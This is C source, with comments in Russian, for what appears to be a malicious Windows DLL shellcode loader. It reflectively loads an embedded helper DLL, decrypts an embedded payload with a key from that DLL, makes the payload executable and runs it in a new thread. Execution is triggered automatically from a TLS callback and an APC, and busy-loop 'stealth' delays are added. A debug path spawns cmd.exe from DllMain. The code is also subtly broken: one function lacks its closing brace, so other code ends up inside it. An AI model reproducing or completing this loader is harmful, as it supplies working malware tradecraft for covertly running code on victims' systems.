#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

#include "encrypted_payload.h"
#include "helper_data.h"

typedef struct _SYSCALL_STUB {
    DWORD syscall_number;
    BYTE stub[32];
} SYSCALL_STUB;

#define TH32CS_SNAPPROCESS 0x00000002

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, SIZE_T*, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = NULL;
NtWriteVirtualMemory_t pNtWriteVirtualMemory = NULL;
NtProtectVirtualMemory_t pNtProtectVirtualMemory = NULL;
NtFreeVirtualMemory_t pNtFreeVirtualMemory = NULL;
NtCreateThreadEx_t pNtCreateThreadEx = NULL;

// ====================== STEALTH ======================
void StealthDelay(ULONG count) {
    volatile ULONG64 x = 0;
    for (ULONG i = 0; i < count; i++) {
        x += i ^ (i * 0x17);
    }

// ======= DEBUG
// ====================== ЗАПУСК CMD.EXE ======================
void RunCmdExe() {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
 
    char cmdLine[] = "cmd.exe";
 
    BOOL success = CreateProcessA(
        NULL, 
        cmdLine, 
        NULL, 
        NULL, 
        FALSE, 
        CREATE_NEW_CONSOLE, 
        NULL, 
        NULL, 
        &si, 
        &pi
    );
 
    if (success) {
        printf("[DEBUG] cmd.exe started successfully! PID: %d\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[DEBUG] CreateProcessA failed. Error: %d\n", GetLastError());
    }
}

// ====================== SHELLCODE RUNNER (для debug) ======================
DWORD WINAPI DebugRunner(LPVOID lpParam) {
    StealthDelay(10000000);  // ~100ms delay
    RunCmdExe();
    return 0;
}

void SetupNtdllFunctions() {
    if (pNtAllocateVirtualMemory && pNtWriteVirtualMemory && pNtProtectVirtualMemory && pNtFreeVirtualMemory && pNtCreateThreadEx) {
        return;
    }
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;

    // Note: This is NOT Hell's Gate - just regular GetProcAddress
    // For actual direct syscalls, use SysWhispers3 or similar in a real project
    pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    pNtFreeVirtualMemory = (NtFreeVirtualMemory_t)GetProcAddress(ntdll, "NtFreeVirtualMemory");
    pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(ntdll, "NtCreateThreadEx");
}


BOOL ReflectiveLoadDLL(BYTE* dllData, HMODULE* outModule) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllData;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllData + dos->e_lfanew);

    BYTE* imageBase = NULL;
    SIZE_T size = nt->OptionalHeader.SizeOfImage;
    NTSTATUS status = pNtAllocateVirtualMemory(GetCurrentProcess(), (PVOID*)&imageBase, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0 || !imageBase) return FALSE;

    memcpy(imageBase, dllData, nt->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (section[i].SizeOfRawData > 0) {
            memcpy(imageBase + section[i].VirtualAddress,
                   dllData + section[i].PointerToRawData,
                   section[i].SizeOfRawData);
        }
    }

    // Relocations
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        DWORD delta = (DWORD_PTR)(imageBase - nt->OptionalHeader.ImageBase);
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(imageBase + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->SizeOfBlock) {
            DWORD entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocList = (PWORD)(reloc + 1);
            for (DWORD i = 0; i < entries; ++i) {
                if ((relocList[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                    *(DWORD64*)(imageBase + reloc->VirtualAddress + (relocList[i] & 0xFFF)) += delta;
                }
            }
            reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
        }
    }

    // Imports (полная обработка)
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (importDesc->Name) {
            char* dllName = (char*)(imageBase + importDesc->Name);
            HMODULE hDll = LoadLibraryA(dllName);
            if (!hDll) {
                SIZE_T freeSize = 0;
                pNtFreeVirtualMemory(GetCurrentProcess(), (PVOID*)&imageBase, &freeSize, MEM_RELEASE);
                return FALSE;
            }

            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(imageBase + importDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA thunkIAT = (PIMAGE_THUNK_DATA)(imageBase + importDesc->FirstThunk);

            while (thunk->u1.AddressOfData) {
                if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    thunkIAT->u1.Function = (ULONG_PTR)GetProcAddress(hDll, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
                } else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(imageBase + thunk->u1.AddressOfData);
                    thunkIAT->u1.Function = (ULONG_PTR)GetProcAddress(hDll, importByName->Name);
                }
                ++thunk;
                ++thunkIAT;
            }
            ++importDesc;
        }
    }

    // Защита секций
    section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD protect = PAGE_READONLY;
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) protect = PAGE_EXECUTE_READ;
        if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) protect = PAGE_EXECUTE_READWRITE;
        ULONG oldProtect;
        SIZE_T protectSize = section[i].Misc.VirtualSize;
        PVOID protectAddr = imageBase + section[i].VirtualAddress;
        pNtProtectVirtualMemory(GetCurrentProcess(), &protectAddr, &protectSize, protect, &oldProtect);
    }

    *outModule = (HMODULE)imageBase;
    return TRUE;
}


 

// // ====================== APC CALLBACK ======================
// VOID NTAPI ApcCallback(ULONG_PTR param) {
//     // Запускаем cmd.exe в отдельном потоке
//     CreateThread(NULL, 0, DebugRunner, NULL, 0, NULL);
// }
 
// // ====================== TLS CALLBACK ======================
// void NTAPI TlsCallback(PVOID hModule, DWORD reason, PVOID reserved) {
//     if (reason == DLL_PROCESS_ATTACH) {
//         StealthDelay(5000000);   // небольшая задержка
//         QueueUserAPC(ApcCallback, GetCurrentThread(), 0);
//     }
// }
 
// // ====================== DLLMAIN ======================
// BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
//     switch (reason) {
//     case DLL_PROCESS_ATTACH:
//         CreateThread(NULL, 0, DebugRunner, NULL, 0, NULL);
//         break;
//     case DLL_PROCESS_DETACH:
//         break;
//     }
//     return TRUE;
// }
 
// ======= END DEBUG


}

// ====================== DERIVE XOR AND ROT FROM KEY ======================
void DeriveXorAndRot(const unsigned char* key, unsigned int key_len, unsigned char* out_xor, int* out_rot) {
    if (key_len == 0) {
        *out_xor = 0x9F;
        *out_rot = 5;
        return;
    }

    // Простая SHA256-подобная хэш-функция (реализация без внешних библиотек)
    unsigned char hash[32] = {0};
    for (unsigned int i = 0; i < key_len; i++) {
        hash[i % 32] ^= key[i];
        hash[(i + 7) % 32] += key[i];
        hash[(i + 13) % 32] ^= (key[i] << 3);
    }

    // A = XOR_KEY = первый + последний байт хэша
    *out_xor = (hash[0] + hash[31]) & 0xFF;

    // B = ROT = сумма всех байт % 7 + 1
    unsigned int sum = 0;
    for (int i = 0; i < 32; i++) {
        sum += hash[i];
    }
    *out_rot = (sum % 7) + 1;
}

void CustomDecrypt(unsigned char* data, unsigned int len, const unsigned char* key, unsigned int key_len) {
    unsigned char xor_key;
    int rot;
    DeriveXorAndRot(key, key_len, &xor_key, &rot);

    for (unsigned int i = 0; i < len; i++) {
        data[i] ^= xor_key;
        data[i] = ((data[i] << rot) & 0xFF) | (data[i] >> (8 - rot));
    }
}


bool queued = false;

// ====================== APC CALLBACK ======================
VOID NTAPI ApcCallback(ULONG_PTR param) {
    queued = true;

    SetupNtdllFunctions();
    HMODULE hHelper = NULL;
    if (ReflectiveLoadDLL(helper_dll_data, &hHelper)) {
        typedef const unsigned char* (*GetKeyFunc)(unsigned int*);
        GetKeyFunc GetKey = (GetKeyFunc)GetProcAddress(hHelper, "GetEncryptionKey");

        if (GetKey) {
            unsigned int key_len = 0;
            const unsigned char* key = GetKey(&key_len);

            unsigned char* decrypted = NULL;
            SIZE_T size = payload_len;
            NTSTATUS status = pNtAllocateVirtualMemory(GetCurrentProcess(), (PVOID*)&decrypted, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (status == 0 && decrypted) {
                memcpy(decrypted, encrypted_payload, payload_len);
                CustomDecrypt(decrypted, payload_len, key, key_len);

                ULONG oldProtect;
                PVOID protectAddr = decrypted;
                pNtProtectVirtualMemory(GetCurrentProcess(), &protectAddr, &size, PAGE_EXECUTE_READWRITE, &oldProtect);

                // Запуск shellcode в отдельном потоке
                HANDLE hThread = NULL;
                status = pNtCreateThreadEx(&hThread, 0x1FFFFF, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)decrypted, NULL, 0, 0, 0, 0, NULL);
                if (status != 0) {
                    // Fallback to CreateThread if NtCreateThreadEx fails
                    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)decrypted, NULL, 0, NULL);
                }
            }
        }
    }
}

// ====================== TLS + DllMain ======================
void NTAPI TlsCallback(PVOID hModule, DWORD reason, PVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        StealthDelay(800000);

        QueueUserAPC(ApcCallback, GetCurrentThread(), 0);
    }
}



BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
switch (reason) {
    case DLL_PROCESS_ATTACH:
        SetupNtdllFunctions();
        CreateThread(NULL, 0, DebugRunner, NULL, 0, NULL);
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// TLS Callback
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:tls_callback")
#pragma data_seg(".CRT$XLA")
PIMAGE_TLS_CALLBACK tls_callback[] = { TlsCallback, NULL };
#pragma data_seg()